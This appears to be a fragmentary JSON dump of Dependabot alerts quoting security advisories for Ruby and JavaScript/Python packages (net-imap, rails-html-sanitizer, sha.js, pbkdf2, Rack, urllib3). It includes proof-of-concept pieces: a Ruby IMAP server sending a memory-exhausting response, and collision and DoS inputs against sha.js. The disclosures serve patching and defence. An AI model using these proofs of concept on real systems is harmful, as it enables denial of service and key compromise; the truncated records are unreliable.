begin\n    sock.print \"* OK test server\\r\\n\"\n    cmd = sock.gets(\"\\r\\n\", chomp: true)\n    tag = cmd.match(/\\A(\\w+) /)[1]\n    puts \"Received: #{cmd}\"\n\n    malicious_response = appenduid_response(size:)\n    puts \"Sending: #{malicious_response.chomp}\"\n    sock.print malicious_response\n\n    malicious_response = copyuid_response(size:)\n    puts \"Sending: #{malicious_response.chomp}\"\n    sock.print malicious_response\n    sock.print \"* CAPABILITY JUMBO=UIDPLUS PROOF_OF_CONCEPT\\r\\n\"\n    sock.print \"#{tag} OK CAPABILITY completed\\r\\n\"\n\n    cmd = sock.gets(\"\\r\\n\", chomp: true)\n    tag = cmd.match(/\\A(\\w+) /)[1]\n    puts \"Received: #{cmd}\"\n    sock.print \"* BYE If you made it this far, you passed the test!\\r\\n\"\n    sock.print \"#{tag} OK LOGOUT completed\\r\\n\"\n  rescue Exception => ex\n    puts \"Error in server: #{ex.message} (#{ex.class})\"\n  ensure\n    sock.close\n    server.close\n  end\nend\n\n# client\nbegin\n  puts \"Client connecting,..\"\n  imap = Net::IMAP.new(server_addr, port: port)\n  puts \"Received capabilities: #{imap.capability}\"\n  pp responses: imap.responses\n  imap.logout\nrescue Exception => ex\n  puts \"Error in client: #{ex.message} (#{ex.class})\"\n  puts ex.full_message\nensure\n  imap.disconnect if imap\nend\n```\n\nUse `ulimit` to limit the process's virtual memory.

Applications may be doing this in a few different ways:\n\n1. using application configuration to configure Action View sanitizers' allowed tags:\n\n  ```ruby\n  # In config/application.rb\n  config.action_view.sanitized_allowed_tags = [\"math\", \"style\"]\n  ```\n\n  see https://guides.rubyonrails.org/configuring.html#configuring-action-view\n\n2. using a `:tags` option to the Action View helper `sanitize`:\n\n  ```\n  <%= sanitize @comment.body, tags: [\"math\", \"style\"] %>\n  ```\n\n  see https://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html#method-i-sanitize\n\n3. setting Rails::HTML5::SafeListSanitizer class attribute `allowed_tags`:\n\n  ```ruby\n  # class-level option\n  Rails::HTML5::SafeListSanitizer.allowed_tags = [\"math\", \"style\"]\n  ```\n\n  (note that this class may also be referenced as `Rails::Html::SafeListSanitizer`)\n\n4. using a `:tags` options to the Rails::HTML5::SafeListSanitizer instance method `sanitize`:\n\n  ```ruby\n  # instance-level option\n  Rails::HTML5::SafeListSanitizer.new.sanitize(@article.body, tags: [\"math\", \"style\"])\n  ```\n\n  (note that this class may also be referenced as `Rails::Html::SafeListSanitizer`)\n\n5. setting ActionText::ContentHelper module attribute `allowed_tags`:\n\n  ```ruby\n  ActionText::ContentHelper.allowed_tags = [\"math\", \"style\"]\n  ```\n\nAll users overriding the allowed tags by any of the above mechanisms to include both \"math\" and \"style\" should either upgrade or use one of the workarounds.\n\n\n## Workarounds\n\nAny one of the following actions will work around this issue:\n\n- Remove \"math\" or \"style\" from the overridden allowed tags,\n- Or, downgrade sanitization to HTML4 (see documentation for [`config.action_view.sanitizer_vendor`](https://guides.rubyonrails.org/configuring.html#config-action-view-sanitizer-vendor) and [`config.action_text.sanitizer_vendor`](https://guides.rubyonrails.org/configuring.html#config-action-text-sanitizer-vendor) for more information).\n\n\n## References\n\n- [CWE - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') (4.9)](https://cwe.mitre.org/data/definitions/79.html)\n- Original report: https://hackerone.com/reports/2519941\n\n## Credit\n\nThis vulnerability was responsibly reported by So Sakaguchi ([mokusou](https://hackerone.com/mokusou)) and [taise](https://hackerone.com/taise).\n","severity":"low","identifiers":[{"value":"GHSA-638j-pmjw-jq48","type":"GHSA"},{"value":"CVE-2024-53986","type":"CVE"}],"references":[{"url":"https://github.com/rails/rails-html-sanitizer/security/advisories/GHSA-638j-pmjw-jq48"},{"url":"https://nvd.nist.gov/vuln/detail/CVE-2024-53986"},{"url":"https://github.com/rails/rails-html-sanitizer/commit/f02ffbb8465e73920b6de0da940f5530f855965e"},{"url":"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rails-html-sanitizer/CVE-2024-53986.yml"},{"url":"https://github.com/advisories/GHSA-638j-pmjw-jq48"}],"published_at":"2024-12-02T21:48:24Z","updated_at":"2024-12-03T18:50:31Z","withdrawn_at":null,"vulnerabilities":[{"package":{"ecosystem":"rubygems","name":"rails-html-sanitizer"},"severity":"low","vulnerable_version_range":"= 1.6.0","first_patched_version":{"identifier":"1.6.1"}}],"cvss_severities":{"cvss_v3":{"vector_string":null,"score":0.0},"cvss_v4":{"vector_string":"CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N","score":2.3}},"epss":{"percentage":0.0024,"percentile":0.47196},"cvss":{"vector_string":null,"score":0.0},"cwes":[{"cwe_id":"CWE-79","name":"Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"}]},"security_vulnerability":{"package":{"ecosystem":"rubygems","name":"rails-html-sanitizer"},"severity":"low","vulnerable_version_range":"= 1.6.0","first_patched_version":{"identifier":"1.6.1"}},"url":"https://api.github.com/repos/arlenagreer/american_laboratory_trading/dependabot/alerts/98","html_url":"https://github.com/arlenagreer/american_laboratory_trading/security/dependabot/98","created_at":"2024-12-02T21:54:46Z","updated_at":"2025-02-27T16:23:28Z","dismissed_at":null,"dismissed_by":null,"dismissed_reason":null,"dismissed_comment":null,"fixed_at":"2025-02-27T16:23:28Z","auto_dismissed_at":null},{"number":97,"state":"fixed","dependency":{"package":{"ecosystem":"rubygems","name":"rexml"},"manifest_path":"Gemfile.lock","scope":"runtime","relationship":"unknown"},"security_advisory":{"ghsa_id":"GHSA-2rxp-v6pw-ch6m","cve_id":"CVE-2024-49761","summary":"REXML ReDoS vulnerability","description":"### Impact\n\nThe REXML gem before 3.3.9 has a ReDoS vulnerability when it parses an XML that has many digits between `&#` and `x...;` in a hex numeric character reference (`&#x...;`).\n\nThis does not happen with Ruby 3.2 or later.

Rails 8.0.0.beta1 depends on Ruby 3.2 or greater so is unaffected.\n\nReleases\n--------\nThe fixed releases are available at the normal locations.\n\nWorkarounds\n-----------\nUsers on Ruby 3.2 are unaffected by this issue.\n\n\nCredits\n-------\nThanks to [scyoon](https://hackerone.com/scyoon) for reporting","severity":"medium","identifiers":[{"value":"GHSA-vfg9-r3fq-jvx4","type":"GHSA"},{"value":"CVE-2024-47887","type":"CVE"}],"references":[{"url":"https://github.com/rails/rails/security/advisories/GHSA-vfg9-r3fq-jvx4"},{"url":"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-47887.yml"},{"url":"https://github.com/advisories/GHSA-vfg9-r3fq-jvx4"}],"published_at":"2024-10-15T23:35:35Z","updated_at":"2024-10-31T19:34:20Z","withdrawn_at":null,"vulnerabilities":[{"package":{"ecosystem":"rubygems","name":"actionpack"},"severity":"medium","vulnerable_version_range":">= 4.0.0, < 6.1.7.9","first_patched_version":{"identifier":"6.1.7.9"}},{"package":{"ecosystem":"rubygems","name":"actionpack"},"severity":"medium","vulnerable_version_range":">= 7.0.0, < 7.0.8.5","first_patched_version":{"identifier":"7.0.8.5"}},{"package":{"ecosystem":"rubygems","name":"actionpack"},"severity":"medium","vulnerable_version_range":">= 7.1.0, < 7.1.4.1","first_patched_version":{"identifier":"7.1.4.1"}},{"package":{"ecosystem":"rubygems","name":"actionpack"},"severity":"medium","vulnerable_version_range":">= 7.2.0, < 7.2.1.1","first_patched_version":{"identifier":"7.2.1.1"}}],"cvss_severities":{"cvss_v3":{"vector_string":null,"score":0.0},"cvss_v4":{"vector_string":"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:U","score":6.6}},"epss":{"percentage":0.00449,"percentile":0.62786},"cvss":{"vector_string":null,"score":0.0},"cwes":[{"cwe_id":"CWE-1333","name":"Inefficient Regular Expression Complexity"}]},"security_vulnerability":{"package":{"ecosystem":"rubygems","name":"actionpack"},"severity":"medium","vulnerable_version_range":">= 4.0.0, < 6.1.7.9","first_patched_version":{"identifier":"6.1.7.9"}},"url":"https://api.github.com/repos/arlenagreer/american_laboratory_trading/dependabot/alerts/94","html_url":"https://github.com/arlenagreer/american_laboratory_trading/security/dependabot/94","created_at":"2024-10-16T02:46:41Z","updated_at":"2025-11-10T20:41:35Z","dismissed_at":"2025-11-10T20:41:35Z","dismissed_by":{"login":"arlenagreer","id":875825,"node_id":"MDQ6VXNlcjg3NTgyNQ==","avatar_url":"https://avatars.githubusercontent.com/u/875825?v=4","gravatar_id":"","url":"https://api.github.com/users/arlenagreer","html_url":"https://github.com/arlenagreer","followers_url":"https://api.github.com/users/arlenagreer/followers","following_url":"https://api.github.com/users/arlenagreer/following{/other_user}","gists_url":"https://api.github.com/users/arlenagreer/gists{/gist_id}","starred_url":"https://api.github.com/users/arlenagreer/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/arlenagreer/subscriptions","organizations_url":"https://api.github.com/users/arlenagreer/orgs","repos_url":"https://api.github.com/users/arlenagreer/repos","events_url":"https://api.github.com/users/arlenagreer/events{/privacy}","received_events_url":"https://api.github.com/users/arlenagreer/received_events","type":"User","user_view_type":"public","site_admin":false},"dismissed_reason":"fix_started","dismissed_comment":null,"fixed_at":null,"auto_dismissed_at":null}]

Hash state rewind on `{length: -x}`. This is behind the PoC above, also this way an attacker can turn a tagged hash in cryptographic libraries into an untagged hash.\n2. Value miscalculation, e.g. a collision is generated by `{ length: buf.length, ...buf, 0: buf[0] + 256 }`\n    This will result in the same hash as of `buf`, but can be treated by other code differently (e.g. bn.js)\n4. DoS on `{length:'1e99'}`\n5. On a subsequent system, (2) can turn into matching hashes but different numeric representations, leading to issues up to private key extraction from cryptography libraries (as nonce is often generated through a hash, and matching nonces for different values often immediately leads to private key restoration)","severity":"critical","identifiers":[{"value":"GHSA-95m3-7q98-8xr5","type":"GHSA"},{"value":"CVE-2025-9288","type":"CVE"}],"references":[{"url":"https://github.com/browserify/sha.js/security/advisories/GHSA-95m3-7q98-8xr5"},{"url":"https://nvd.nist.gov/vuln/detail/CVE-2025-9288"},{"url":"https://github.com/browserify/sha.js/pull/78"},{"url":"https://github.com/browserify/sha.js/commit/f2a258e9f2d0fcd113bfbaa49706e1ac0d979ba5"},{"url":"https://www.cve.org/CVERecord?id=CVE-2025-9287"},{"url":"https://lists.debian.org/debian-lts-announce/2025/09/msg00016.html"},{"url":"https://github.com/advisories/GHSA-95m3-7q98-8xr5"}],"published_at":"2025-08-21T14:47:55Z","updated_at":"2025-11-03T21:35:27Z","withdrawn_at":null,"vulnerabilities":[{"package":{"ecosystem":"npm","name":"sha.js"},"severity":"critical","vulnerable_version_range":"<=

Unsupported algos (e.g. `sha3-256` / `sha3-512` / `sha512-256`)\n 2. Supported but non-normalized algos (e.g. `Sha256` / `Sha512` / `SHA1` / `sha-1` / `sha-256` / `sha-512`)\n\nAll of those work correctly in Node.js, but this polyfill silently returns highly predictable ouput\n\nUnder Node.js (only with `pbkdf2/browser` import, unlikely) / Bun (`pbkdf2` top-level import is affected), the memory is not zero-filled but is uninitialized, as `Buffer.allocUnsafe` is used\n\nUnder browsers, it just returns zero-filled buffers\n(Which is also critical, those are completely unacceptable as kdf output and ruin security)\n\n### Were you affected?\n\nThe full list of arguments that were **not** affected were literal:\n * `'md5'`\n * `'sha1'`\n * `'sha224'`\n * `'sha256'`\n * `'sha384'`\n * `'sha512'`\n * `'rmd160'`\n * `'ripemd160'`\n\nAny other arguments, e.g. representation variations of the above ones like `'SHA-1'`/`'sha-256'`/`'SHA512'` or  different algos like `'sha3-512'`/`'blake2b512'`, while supported on Node.js `crypto` module, returned predictable output on `pbkdf2` (or `crypto` browser/bundlers polyfill)\n\n---\n\nBeware of packages re-exporting this under a different signature, like (abstract):\n```js\nconst crypto = require('crypto')\nmodule.exports.deriveKey = (algo, pass, salt) => crypto.pbkdf2Sync(pass, salt, 2048, 64, algo)\n```\n\nIn this case, the resulting `deriveKey` method is also affected (to the same extent / conditions as listed here).\n\n### Environments\n\nThis affects `require('crypto')` in polyfilled mode (e.g. from `crypto-browserify`, `node-libs-browser`, `vite-plugin-node-polyfills`, `node-stdlib-browser`, etc. -- basically everything that bundles/polfyills `crypto`\n\n* In bundled code (e.g. Webpack / Vite / whatever), this affects `require('crypto')` and `require('pbkdf2')`\n* On Node.js, this does not affect `require('pbkdf2')` (or `require('crypto')` obviously), but affects `require('pbkdf2/browser')`\n* On Bun, this _does_ affect `require('pbkdf2')` _and_  `require('pbkdf2/browser')` (and returns uninitialized memory, often zeros / sparse flipped bytes)\n\n### PoC\n```js\nconst node = require('crypto')\nconst

key.toString('hex')\n  if (hex !== prev) console.log(hex);\n  prev = hex\n}\n```\n\n### Affected versions\n\nSeems to be since https://github.com/browserify/pbkdf2/commit/9699045c37a07f8319cfb8d44e2ff4252d7a7078\n\n### Impact\n\nThis is critical, browserifying code might silently generate zero-filled keys instead of proper ones, for code that was working on Node.js or in test environment\n\nJust updating to a fixed version is not enough: if anyone was using `pbkdf2` lib (e.g. via `crypto-browserify` or directly) on algos not from the literal string list (see \"were you affected\"), recheck where those keys went / how they were used,  and take action accordingly\n\n### Note\n\nMost likely, you receive this either through a subdep using `pbkdf2` module directly (and then it is used), or through `crypto-browserify` (and the usage depends on whether you or any of your subdeps were calling `pbkdf2/pbkdf2Sync` methods from Node.js crypto inside your bundle)\n\nWhen targeting non-Node.js, prever avoiding Node.js crypto polyfill at all, and use `crypto.subtle` and/or modern/audited cryptography primitives instead","severity":"critical","identifiers":[{"value":"GHSA-h7cp-r72f-jxh6","type":"GHSA"},{"value":"CVE-2025-6545","type":"CVE"}],"references":[{"url":"https://github.com/browserify/pbkdf2/security/advisories/GHSA-h7cp-r72f-jxh6"},{"url":"https://nvd.nist.gov/vuln/detail/CVE-2025-6545"},{"url":"https://github.com/browserify/pbkdf2/commit/9699045c37a07f8319cfb8d44e2ff4252d7a7078"},{"url":"https://github.com/browserify/pbkdf2/commit/e3102a8cd4830a3ac85cd0dd011cc002fdde33bb"},{"url":"https://github.com/advisories/GHSA-h7cp-r72f-jxh6"}],"published_at":"2025-06-23T22:41:50Z","updated_at":"2025-06-23T22:41:52Z","withdrawn_at":null,"vulnerabilities":[{"package":{"ecosystem":"npm","name":"pbkdf2"},"severity":"critical","vulnerable_version_range":">=

When the project is started, an attacker might access any file on the developer's machine and exfiltrate the content (e.g. password, configuration files, private source code, ...).\n\nIf the development server is listening on a public IP address (or **0.0.0.0**), an attacker on the local network can access the local files without any interaction from the victim (direct connection to the port).\n\nIf the server allows access from third-party domains (CORS, **_Allow-Access-Origin: *_** ), an attacker can send a malicious link to the victim.

Specially crafted headers could cause `Rack::Sendfile` to miscommunicate with the proxy and trigger unintended internal requests, potentially bypassing proxy-level access restrictions.\n\n## Details\n\nWhen `Rack::Sendfile` received untrusted `x-sendfile-type` or `x-accel-mapping` headers from a client, it would interpret them as proxy configuration directives. This could cause the middleware to send a \"redirect\" response to the proxy, prompting it to reissue a new internal request that was **not subject to the proxy's access controls**.\n\nAn attacker could exploit this by:\n1.

However since this\nfunction is related to writing data we do not consider it security significant.\n\nThe FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue.","severity":"medium","identifiers":[{"value":"GHSA-9v9h-cgj8-h64p","type":"GHSA"},{"value":"CVE-2024-0727","type":"CVE"}],"references":[{"url":"https://nvd.nist.gov/vuln/detail/CVE-2024-0727"},{"url":"https://github.com/openssl/openssl/commit/09df4395b5071217b76dc7d3d2e630eb8c5a79c2"},{"url":"https://github.com/openssl/openssl/commit/775acfdbd0c6af9ac855f34969cdab0c0c90844a"},{"url":"https://github.com/openssl/openssl/commit/d135eeab8a5dbf72b3da5240bab9ddb7678dbd2c"},{"url":"https://github.openssl.org/openssl/extended-releases/commit/03b3941d60c4bce58fab69a0c22377ab439bc0e8"},{"url":"https://github.openssl.org/openssl/extended-releases/commit/aebaa5883e31122b404e450732dc833dc9dee539"},{"url":"https://www.openssl.org/news/secadv/20240125.txt"},{"url":"https://github.com/github/advisory-database/pull/3472"},{"url":"https://github.com/openssl/openssl/pull/23362"},{"url":"https://github.com/alexcrichton/openssl-src-rs/commit/add20f73b6b42be7451af2e1044d4e0e778992b2"},{"url":"https://github.com/pyca/cryptography/commit/3519591d255d4506fbcd0d04037d45271903c64d"},{"url":"https://security.netapp.com/advisory/ntap-20240208-0006"},{"url":"http://www.openwall.com/lists/oss-security/2024/03/11/1"},{"url":"https://lists.debian.org/debian-lts-announce/2024/10/msg00033.html"},{"url":"https://lists.debian.org/debian-lts-announce/2024/11/msg00000.html"},{"url":"https://github.com/advisories/GHSA-9v9h-cgj8-h64p"}],"published_at":"2024-01-26T09:30:23Z","updated_at":"2025-11-04T00:30:45Z","withdrawn_at":null,"vulnerabilities":[{"package":{"ecosystem":"pip","name":"cryptography"},"severity":"medium","vulnerable_version_range":"< 42.0.2","first_patched_version":{"identifier":"42.0.2"}}],"cvss_severities":{"cvss_v3":{"vector_string":"CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H","score":5.5},"cvss_v4":{"vector_string":null,"score":0.0}},"epss":{"percentage":0.00213,"percentile":0.4385},"cvss":{"vector_string":"CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H","score":5.5},"cwes":[{"cwe_id":"CWE-476","name":"NULL Pointer Dereference"}]},"security_vulnerability":{"package":{"ecosystem":"pip","name":"cryptography"},"severity":"medium","vulnerable_version_range":"< 42.0.2","first_patched_version":{"identifier":"42.0.2"}},"url":"https://api.github.com/repos/arlenagreer/ellerton-adsense-api/dependabot/alerts/19","html_url":"https://github.com/arlenagreer/ellerton-adsense-api/security/dependabot/19","created_at":"2025-11-14T22:24:04Z","updated_at":"2025-11-14T22:24:04Z","dismissed_at":null,"dismissed_by":null,"dismissed_reason":null,"dismissed_comment":null,"fixed_at":null,"auto_dismissed_at":null},{"number":18,"state":"open","dependency":{"package":{"ecosystem":"pip","name":"cryptography"},"manifest_path":"requirements-prod.txt","scope":"runtime","relationship":"unknown"},"security_advisory":{"ghsa_id":"GHSA-3ww4-gg4f-jr7f","cve_id":"CVE-2023-50782","summary":"Python Cryptography package vulnerable to Bleichenbacher timing oracle attack","description":"A flaw was found in the python-cryptography package.

In those cases, urllib3 doesn't treat the `Proxy-Authorization` HTTP header as one carrying authentication material and thus doesn't strip the header on cross-origin redirects.\n\nBecause this is a highly unlikely scenario, we believe the severity of this vulnerability is low for almost all users. Out of an abundance of caution urllib3 will automatically strip the `Proxy-Authorization` header during cross-origin redirects to avoid the small chance that users are doing this on accident.\n\nUsers should use urllib3's proxy support or disable automatic redirects to achieve safe processing of the `Proxy-Authorization` header, but we still decided to strip the header by default in order to further protect users who aren't using the correct approach.\n\n## Affected usages\n\nWe believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:\n\n* Setting the `Proxy-Authorization` header without using urllib3's built-in proxy support.\n* Not disabling HTTP redirects.\n* Either not using an HTTPS origin server or for the proxy or target origin to redirect to a malicious origin.\n\n## Remediation\n\n* Using the `Proxy-Authorization` header with urllib3's `ProxyManager`.\n* Disabling HTTP redirects using `redirects=False` when sending requests.\n* Not using the `Proxy-Authorization` header.","severity":"medium","identifiers":[{"value":"GHSA-34jh-p97f-mpxf","type":"GHSA"},{"value":"CVE-2024-37891","type":"CVE"}],"references":[{"url":"https://github.com/urllib3/urllib3/security/advisories/GHSA-34jh-p97f-mpxf"},{"url":"https://nvd.nist.gov/vuln/detail/CVE-2024-37891"},{"url":"https://github.com/urllib3/urllib3/commit/40b6d1605814dd1db0a46e202d6e56f2e4c9a468"},{"url":"https://github.com/urllib3/urllib3/commit/accff72ecc2f6cf5a76d9570198a93ac7c90270e"},{"url":"https://lists.debian.org/debian-lts-announce/2024/12/msg00020.html"},{"url":"https://security.netapp.com/advisory/ntap-20240822-0003"},{"url":"https://www.vicarius.io/vsociety/posts/proxy-authorization-header-handling-vulnerability-in-urllib3-cve-2024-37891"},{"url":"https://github.com/advisories/GHSA-34jh-p97f-mpxf"}],"published_at":"2024-06-17T21:37:20Z","updated_at":"2025-11-04T16:50:52Z","withdrawn_at":null,"vulnerabilities":[{"package":{"ecosystem":"pip","name":"urllib3"},"severity":"medium","vulnerable_version_range":"< 1.26.19","first_patched_version":{"identifier":"1.26.19"}},{"package":{"ecosystem":"pip","name":"urllib3"},"severity":"medium","vulnerable_version_range":">= 2.0.0, < 2.2.2","first_patched_version":{"identifier":"2.2.2"}}],"cvss_severities":{"cvss_v3":{"vector_string":"CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N","score":4.4},"cvss_v4":{"vector_string":null,"score":0.0}},"epss":{"percentage":0.00142,"percentile":0.35137},"cvss":{"vector_string":"CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N","score":4.4},"cwes":[{"cwe_id":"CWE-669","name":"Incorrect Resource Transfer Between Spheres"}]},"security_vulnerability":{"package":{"ecosystem":"pip","name":"urllib3"},"severity":"medium","vulnerable_version_range":">= 2.0.0, < 2.2.2","first_patched_version":{"identifier":"2.2.2"}},"url":"https://api.github.com/repos/arlenagreer/ellerton-adsense-api/dependabot/alerts/5","html_url":"https://github.com/arlenagreer/ellerton-adsense-api/security/dependabot/5","created_at":"2025-11-14T22:24:02Z","updated_at":"2025-11-14T22:24:02Z","dismissed_at":null,"dismissed_by":null,"dismissed_reason":null,"dismissed_comment":null,"fixed_at":null,"auto_dismissed_at":null},{"number":4,"state":"open","dependency":{"package":{"ecosystem":"pip","name":"requests"},"manifest_path":"requirements-base.txt","scope":"runtime","relationship":"unknown"},"security_advisory":{"ghsa_id":"GHSA-9wx4-h78v-vm56","cve_id":"CVE-2024-35195","summary":"Requests `Session` object does not verify requests after making first request with verify=False","description":"When making requests through a Requests `Session`, if the first request is made with `verify=False` to disable cert verification, all subsequent requests to the same origin will continue to ignore cert verification regardless of changes to the value of `verify`.
